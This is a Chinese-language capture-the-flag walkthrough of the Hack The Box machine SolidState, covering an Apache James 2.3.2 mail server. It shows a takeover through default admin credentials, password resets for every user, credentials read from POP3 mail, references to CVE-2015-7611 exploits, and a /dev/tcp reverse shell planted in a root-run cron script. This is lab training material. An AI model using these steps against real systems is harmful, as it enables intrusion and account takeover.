## Recon

```bash=
┌──(kali😺dkri3c1)-[~]
└─$ rustscan -a 10.129.3.80 -r 1-65535 --ulimit 5000 -- -sC -sV -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: Where scanning meets swagging. 😎

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.129.3.28:22
Open 10.129.3.28:25
Open 10.129.3.28:110
Open 10.129.3.28:119
Open 10.129.3.28:4555
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sC -sV -Pn" on ip 10.129.3.28
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-21 00:06 EST
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 00:06
Completed NSE at 00:06, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 00:06
Completed NSE at 00:06, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 00:06
Completed NSE at 00:06, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 00:06
Completed Parallel DNS resolution of 1 host. at 00:06, 0.13s elapsed
DNS resolution of 1 IPs took 0.13s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 00:06
Scanning 10.129.3.28 [5 ports]
Discovered open port 110/tcp on 10.129.3.28
Discovered open port 119/tcp on 10.129.3.28
Discovered open port 22/tcp on 10.129.3.28
Discovered open port 25/tcp on 10.129.3.28
Discovered open port 4555/tcp on 10.129.3.28
Completed SYN Stealth Scan at 00:06, 0.08s elapsed (5 total ports)
Initiating Service scan at 00:06
Scanning 5 services on 10.129.3.28
Service scan Timing: About 40.00% done; ETC: 00:12 (0:03:57 remaining)
Completed Service scan at 00:09, 166.45s elapsed (5 services on 1 host)
NSE: Script scanning 10.129.3.28.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 00:09
NSE Timing: About 99.15% done; ETC: 00:09 (0:00:00 remaining)
Completed NSE at 00:10, 58.81s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 00:10
NSE Timing: About 80.00% done; ETC: 00:10 (0:00:08 remaining)
NSE Timing: About 92.50% done; ETC: 00:11 (0:00:05 remaining)
NSE Timing: About 95.00% done; ETC: 00:11 (0:00:05 remaining)
NSE Timing: About 97.50% done; ETC: 00:12 (0:00:03 remaining)
Completed NSE at 00:12, 142.29s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 00:12
Completed NSE at 00:12, 0.00s elapsed
Nmap scan report for 10.129.3.28
Host is up, received user-set (0.055s latency).
Scanned at 2026-01-21 00:06:15 EST for 368s

PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey:
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCp5WdwlckuF4slNUO29xOk/Yl/cnXT/p6qwezI0ye+4iRSyor8lhyAEku/yz8KJXtA+ALhL7HwYbD3hDUxDkFw90V1Omdedbk7SxUVBPK2CiDpvXq1+r5fVw26WpTCdawGKkaOMYoSWvliBsbwMLJEUwVbZ/GZ1SUEswpYkyZeiSC1qk72L6CiZ9/5za4MTZw8Cq0akT7G+mX7Qgc+5eOEGcqZt3cBtWzKjHyOZJAEUtwXAHly29KtrPUddXEIF0qJUxKXArEDvsp7OkuQ0fktXXkZuyN/GRFeu3im7uQVuDgiXFKbEfmoQAsvLrR8YiKFUG6QBdI9awwmTkLFbS1Z
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBISyhm1hXZNQl3cslogs5LKqgWEozfjs3S3aPy4k3riFb6UYu6Q1QsxIEOGBSPAWEkevVz1msTrRRyvHPiUQ+eE=
|   256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMKbFbK3MJqjMh9oEw/2OVe0isA7e3ruHz5fhUP4cVgY
25/tcp   open  smtp?   syn-ack ttl 63
|_smtp-commands: Couldn't establish connection on port 25
110/tcp  open  pop3?   syn-ack ttl 63
119/tcp  open  nntp?   syn-ack ttl 63
4555/tcp open  rsip?   syn-ack ttl 63
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 00:12
Completed NSE at 00:12, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 00:12
Completed NSE at 00:12, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 00:12
Completed NSE at 00:12, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 368.64 seconds
           Raw packets sent: 5 (220B) | Rcvd: 5 (220B)

```

## Exploit

簡單整理一下 port 是幹嘛ㄉ，因為只聽過 SMTP XD



| port | 名稱 | 作用 |
| -------- | -------- | -------- |
| 25     | SMTP     | 寄信     |
| 110     | POP     | 收信     |
| 4555     | James Remote Administration Tool     | 管理這寄信跟收信     |

發現是 SMTP ，這邊用 telnet 連上去看看長怎樣

![image](https://hackmd.io/_uploads/B1-Lf1Rr-l.png)

可以看到 version 是 `JAMES SMTP Server 2.3.2`

接著就去搜文章，參考

https://medium.com/@akshadjoshi/smtp-server-james-smtp-server-2-3-2-ad934435f021

telnet 上去 port 4555 ，然後用預設使用者&密碼 `root/root`，進去之後列出所有 user


![image](https://hackmd.io/_uploads/HkIyX1RSWl.png)

然後把使用者的密碼改掉

```bash=
┌──(kali😺dkri3c1)-[~/htb]
└─$ telnet 10.129.3.80 4555
Trying 10.129.3.80...
Connected to 10.129.3.80.
Escape character is '^]'.
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
HELP
Currently implemented commands:
help                                    display this help
listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser [username] [password]           add a new user
verify [username]                       verify if specified user exist
deluser [username]                      delete existing user
setpassword [username] [password]       sets a user's password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a user's current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a user's email to another email address
showforwarding [username]               shows a user's current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit                                    close connection
listusers
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin
setpassword james 123
Password for james reset
setpassword thomas 123
Password for thomas reset
setpassword john 123
Password for john reset
setpassword mindy 123
Password for mindy reset
setpassword mailadmin 123
Password for mailadmin reset
```


之後連上去 port 110 逐步嘗試會發現只有 mindy 裡面有信件

```bash=
┌──(kali😺dkri3c1)-[~/htb]
└─$ telnet 10.129.3.80 110
Trying 10.129.3.80...
Connected to 10.129.3.80.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready
USER james
+OK
PASS 123
+OK Welcome james
LIST
+OK 0 0
.
RETR
-ERR Usage: RETR [mail number]
^Ce
^C^C
【【【【【【【
【
】
^]
telnet> quit
Connection closed.

┌──(kali😺dkri3c1)-[~/htb]
└─$ telnet 10.129.3.80 110
Trying 10.129.3.80...
Connected to 10.129.3.80.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready
USER thomas
+OK
123
-ERR
PASS 123
+OK Welcome thomas
LIST
+OK 0 0
.
```

看 mindy 裡面的信件

```bash=
┌──(kali😺dkri3c1)-[~/htb]
└─$ telnet 10.129.3.80 110
Trying 10.129.3.80...
Connected to 10.129.3.80.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready
USER mindy
+OK
PASS 123
+OK Welcome mindy
LIST
+OK 2 1945
1 1109
2 836
.
RETR 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <5420213.0.1503422039826.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
From: mailadmin@localhost
Subject: Welcome

Dear Mindy,
Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.

We are looking forward to you joining our team and your success at Solid State Security.

Respectfully,
James
.
RETR 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login.
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path.

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James
```

現在我們知道 mindy 的 ssh key 了，拿去登入可以拿到 user flag，但是現在的環境是 rbash，不像 `/bin/sh` 有那麼多可用的工具，所以要另外開一個 rev shell

![image](https://hackmd.io/_uploads/S1XQ8wCrWl.png)



而我在搜 JAMES SMTP Server 2.3.2 相關的資料發現這版本有 CVE => cve-2015-7611  ， 而裡面的 POC 正好需要登入 ssh 當作媒介來觸發 exploit，這邊用 https://www.exploit-db.com/exploits/48130

但有趣的來了，照著 POC 做發現成功不了，於是跑去看ㄌ wp QQ ，然後發現是 上面的 POC 壞了= =

https://www.exploit-db.com/exploits/35513

用了這個之後就成功ㄌ。。 (以後要多試試看其他 POC ㄌQQ)

![image](https://hackmd.io/_uploads/BJEisvCrWl.png)

之後就是一頓搜尋，在 `opt` 發現有一個 root 擁有的檔案，`tmp.py`，把他改成 `import os;os.system('/bin/sh')` 沒反應

![image](https://hackmd.io/_uploads/rknXpPABbg.png)

於是想說他本身可能是一個排程檔案，會定期執行，於是就戳一個 reverse shell 出來

```bash=
cat > tmp.py << 'EOF'
import os
os.system("bash -c 'bash -i >& /dev/tcp/10.10.14.35/8787 0>&1'")
EOF
```

![image](https://hackmd.io/_uploads/rk3Gl_AHZl.png)


之後等系統執行，就會拿到 root Flag ㄌ

![image](https://hackmd.io/_uploads/SksNeuCSZl.png)


BTW，在看其他篇 wp 的時候發現也可用 sshpass 去繞 rbash

- sshpass
    - 免去終端交互的 ssh 登入方式

```bash=
sshpass -p 'P@55W0rd1!2@' ssh mindy@10.129.3.80 -t bash
```

## Pwned!


![image](https://hackmd.io/_uploads/HyCBedCSbg.png)
